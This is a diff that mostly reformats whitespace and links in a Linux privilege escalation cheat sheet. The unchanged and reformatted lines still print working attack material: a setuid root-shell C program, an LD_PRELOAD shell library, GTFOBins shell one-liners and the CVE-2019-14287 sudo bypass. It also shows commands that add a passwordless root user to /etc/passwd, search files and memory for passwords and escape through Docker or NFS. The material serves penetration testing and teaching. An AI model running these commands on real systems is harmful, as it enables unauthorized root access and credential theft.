@@ -5,48 +5,47 @@
 * [Tools](#tools)
 * [Checklist](#checklists)
 * [Looting for passwords](#looting-for-passwords)
-    * [Files containing passwords](#files-containing-passwords)
-    * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
-    * [Last edited files](#last-edited-files)
-    * [In memory passwords](#in-memory-passwords)
-    * [Find sensitive files](#find-sensitive-files)
+  * [Files containing passwords](#files-containing-passwords)
+  * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
+  * [Last edited files](#last-edited-files)
+  * [In memory passwords](#in-memory-passwords)
+  * [Find sensitive files](#find-sensitive-files)
 * [SSH Key](#ssh-key)
-    * [Sensitive files](#sensitive-files)
-    * [SSH Key Predictable PRNG (Authorized_Keys) Process](#ssh-key-predictable-prng-authorized_keys-process)
+  * [Sensitive files](#sensitive-files)
+  * [SSH Key Predictable PRNG (Authorized_Keys) Process](#ssh-key-predictable-prng-authorized_keys-process)
 * [Scheduled tasks](#scheduled-tasks)
-    * [Cron jobs](#cron-jobs)
-    * [Systemd timers](#systemd-timers)
+  * [Cron jobs](#cron-jobs)
+  * [Systemd timers](#systemd-timers)
 * [SUID](#suid)
-    * [Find SUID binaries](#find-suid-binaries)
-    * [Create a SUID binary](#create-a-suid-binary)
+  * [Find SUID binaries](#find-suid-binaries)
+  * [Create a SUID binary](#create-a-suid-binary)
 * [Capabilities](#capabilities)
-    * [List capabilities of binaries](#list-capabilities-of-binaries)
-    * [Edit capabilities](#edit-capabilities)
-    * [Interesting capabilities](#interesting-capabilities)
+  * [List capabilities of binaries](#list-capabilities-of-binaries)
+  * [Edit capabilities](#edit-capabilities)
+  * [Interesting capabilities](#interesting-capabilities)
 * [SUDO](#sudo)
-    * [NOPASSWD](#nopasswd)
-    * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
-    * [Doas](#doas)
-    * [sudo_inject](#sudo-inject)
-    * [CVE-2019-14287](#cve-2019-14287)
+  * [NOPASSWD](#nopasswd)
+  * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
+  * [Doas](#doas)
+  * [sudo_inject](#sudo-inject)
+  * [CVE-2019-14287](#cve-2019-14287)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
 * [Writable files](#writable-files)
-    * [Writable /etc/passwd](#writable-etcpasswd)
-    * [Writable /etc/sudoers](#writable-etcsudoers)
+  * [Writable /etc/passwd](#writable-etcpasswd)
+  * [Writable /etc/sudoers](#writable-etcsudoers)
 * [NFS Root Squashing](#nfs-root-squashing)
 * [Shared Library](#shared-library)
-    * [ldconfig](#ldconfig)
-    * [RPATH](#rpath)
+  * [ldconfig](#ldconfig)
+  * [RPATH](#rpath)
 * [Groups](#groups)
-    * [Docker](#docker)
-    * [LXC/LXD](#lxclxd)
+  * [Docker](#docker)
+  * [LXC/LXD](#lxclxd)
 * [Kernel Exploits](#kernel-exploits)
-    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
-    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
-    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
-    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)
-
+  * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
+  * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
+  * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
+  * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)
 
 ## Tools
 
@@ -60,7 +59,7 @@
     ```
 
 - [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
-    
+
     ```powershell
     ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
     ```
@@ -69,7 +68,6 @@
 - [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
 - [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 - [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
-
 
 ## Checklists
 
@@ -136,7 +134,7 @@
   * Find/list all accessible *.plan files and display contents
   * Find/list all accessible *.rhosts files and display contents
   * Show NFS server details
-  * Locate *.conf and *.log files containing keyword supplied at script runtime
+  * Locate *.conf and*.log files containing keyword supplied at script runtime
   * List all *.conf files located in /etc
   * Locate mail
 * Platform/software specific tests:
@@ -157,8 +155,7 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 
 The `/etc/security/opasswd` file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.
 
-:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes 
-
+:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes
 
 ### Last edited files
 
@@ -177,7 +174,7 @@ strings /dev/mem -n10 | grep -i PASS
 ### Find sensitive files
 
 ```powershell
-$ locate password | more           
+$ locate password | more
 /boot/grub/i386-pc/password.mod
 /etc/pam.d/common-password
 /etc/pam.d/gdm-password
@@ -207,7 +204,7 @@ Needed : SSH-DSS String from authorized_keys file
 1. Get the authorized_keys file. An example of this file would look like so:
 
 ```
-ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
+ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ...
 ```
 
 2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:
@@ -245,15 +242,15 @@ And you should connect without requiring a password. If stuck, the `-vvv` verbos
 
 ### Cron jobs
 
-Check if you have access with write permission on these files.   
-Check inside the file, to find other paths with write permissions.   
+Check if you have access with write permission on these files.
+Check inside the file, to find other paths with write permissions.
 
 ```powershell
 /etc/init.d
 /etc/cron*
 /etc/crontab
 /etc/cron.allow
-/etc/cron.d 
+/etc/cron.d
 /etc/cron.deny
 /etc/cron.daily
 /etc/cron.hourly
@@ -280,9 +277,8 @@ You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 
 ```powershell
 # print both commands and file system events and scan procfs every 1000 ms (=1sec)
-./pspy64 -pf -i 1000 
+./pspy64 -pf -i 1000
 ```
-
 
 ## Systemd timers
 
@@ -302,7 +298,7 @@ SUID/Setuid stands for "set user ID upon execution", it is enabled by default in
 
 ```powershell
 ╭─swissky@lab ~  
-╰─$ ls /usr/bin/sudo -alh                  
+╰─$ ls /usr/bin/sudo -alh
 -rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
 ```
 
@@ -316,16 +312,15 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 ### Create a SUID binary
 
 ```bash
-print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
 gcc -o /tmp/suid /tmp/suid.c  
 sudo chmod +x /tmp/suid # execute right
 sudo chmod +s /tmp/suid # setuid bit
 ```
 
-
 ## Capabilities
 
-### List capabilities of binaries 
+### List capabilities of binaries
 
 ```bash
 ╭─swissky@lab ~  
@@ -349,8 +344,9 @@ sudo chmod +s /tmp/suid # setuid bit
 ### Interesting capabilities
 
 Having the capability =ep means the binary has all the capabilities.
+
 ```powershell
-$ getcap openssl /usr/bin/openssl 
+$ getcap openssl /usr/bin/openssl
 openssl=ep
 ```
 
@@ -426,10 +422,10 @@ Compile the following shared object using the C code below with `gcc -fPIC -shar
 #include <sys/types.h>
 #include <stdlib.h>
 void _init() {
-	unsetenv("LD_PRELOAD");
-	setgid(0);
-	setuid(0);
-	system("/bin/sh");
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/sh");
 }
 ```
 
@@ -449,8 +445,8 @@ Using [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo
 
 ```powershell
 $ sudo whatever
-[sudo] password for user:    
-# Press <ctrl>+c since you don't have the password. 
+[sudo] password for user:
+# Press <ctrl>+c since you don't have the password.
 # This creates an invalid sudo tokens.
 $ sh exploit.sh
 .... wait 1 seconds
@@ -460,7 +456,6 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
-
 
 ### CVE-2019-14287
 
@@ -479,11 +474,10 @@ sudo -u#4294967295 id
 
 The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
 
-> gdb -nx -ex '!sh' -ex quit    
-> sudo mysql -e '\! /bin/sh'    
-> strace -o /dev/null /bin/sh    
+> gdb -nx -ex '!sh' -ex quit
+> sudo mysql -e '\! /bin/sh'
+> strace -o /dev/null /bin/sh
 > sudo awk 'BEGIN {system("/bin/sh")}'
-
 
 ## Wildcard
 
@@ -523,8 +517,9 @@ DEVICE=eth0
 EXEC :
 ./etc/sysconfig/network-scripts/ifcfg-1337
 ```
+
 src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f]
-(https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+(<https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f>)
 
 ### Writable /etc/passwd
 
@@ -546,7 +541,7 @@ E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 You can now use the `su` command with `hacker:hacker`
 
-Alternatively you can use the following lines to add a dummy user without a password.    
+Alternatively you can use the following lines to add a dummy user without a password.
 WARNING: you might degrade the current security of the machine.
 
 ```powershell
@@ -554,7 +549,7 @@ echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
 
-NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
+NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
 
 ### Writable /etc/sudoers
 
@@ -577,15 +572,15 @@ showmount -e 10.10.10.10
 # create dir
 mkdir /tmp/nfsdir  
 
-# mount directory 
-mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+# mount directory
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
 cd /tmp/nfsdir
 
-# copy wanted shell 
-cp /bin/bash . 	
+# copy wanted shell
+cp /bin/bash .  
 
 # set suid permission
-chmod +s bash 	
+chmod +s bash  
 ```
 
 ## Shared Library
@@ -598,7 +593,7 @@ Identify shared libraries with `ldd`
 $ ldd /opt/binary
     linux-vdso.so.1 (0x00007ffe961cd000)
     vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
-    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
+    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)
 ```
 
 Create a library in `/tmp` and activate the path.
@@ -616,7 +611,7 @@ level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
  0x00000001 (NEEDED)                     Shared library: [libc.so.6]
  0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 
-level15@nebula:/home/flag15$ ldd ./flag15 
+level15@nebula:/home/flag15$ ldd ./flag15
  linux-gate.so.1 =>  (0x0068c000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
  /lib/ld-linux.so.2 (0x005bb000)
@@ -627,7 +622,7 @@ By copying the lib into `/var/tmp/flag15/` it will be used by the program in thi
 ```powershell
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
-level15@nebula:/home/flag15$ ldd ./flag15 
+level15@nebula:/home/flag15$ ldd ./flag15
  linux-gate.so.1 =>  (0x005b0000)
  libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
  /lib/ld-linux.so.2 (0x00737000)
@@ -670,11 +665,11 @@ Or use the following docker image from [chrisfosterelli](https://hub.docker.com/
 ```powershell
 $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
 latest: Pulling from chrisfosterelli/rootplease
-2de59b831a23: Pull complete 
-354c3661655e: Pull complete 
-91930878a2d7: Pull complete 
-a3ed95caeb02: Pull complete 
-489b110c54dc: Pull complete 
+2de59b831a23: Pull complete
+354c3661655e: Pull complete
+91930878a2d7: Pull complete
+a3ed95caeb02: Pull complete
+489b110c54dc: Pull complete
 Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
 Status: Downloaded newer image for chrisfosterelli/rootplease:latest
 
@@ -723,11 +718,12 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
-Alternatively https://github.com/initstring/lxd_root
+Alternatively <https://github.com/initstring/lxd_root>
 
 ## Kernel Exploits
 
 Precompiled exploits can be found inside these repositories, run them at your own risk !
+
 * [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
 * [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)
 
@@ -769,7 +765,6 @@ Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
 https://www.exploit-db.com/exploits/18411
 ```
 
-
 ## References
 
 - [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
@@ -782,6 +777,7 @@ https://www.exploit-db.com/exploits/18411
 - [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
 - [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
 - [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
+
 * [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
 * [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
